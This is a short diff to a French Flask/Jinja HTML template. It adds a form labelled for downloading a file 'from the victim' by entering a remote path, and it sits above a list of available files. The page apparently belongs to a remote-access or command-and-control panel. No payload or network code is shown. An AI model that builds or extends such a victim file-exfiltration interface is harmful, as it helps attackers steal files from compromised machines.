@@ -1,6 +1,15 @@
 {% extends "base.html" %}
 {% block content %}
-<h1>📥 Fichiers disponibles</h1>
+<h3>📥 Télécharger un fichier depuis la victime</h3>
+<form method="POST" action="{{ url_for('download_remote') }}">
+    <label for="remote_path">Chemin distant :</label><br>
+    <input type="text" name="remote_path" placeholder="/tmp/test.txt" required>
+    <button type="submit">Télécharger</button>
+</form>
+
+<hr>
+
+<h3>📥 Fichiers disponibles</h3>
 <ul>
     {% for file in files %}
     <li><a href="{{ url_for('download_file', filename=file) }}">{{ file }}</a></li>
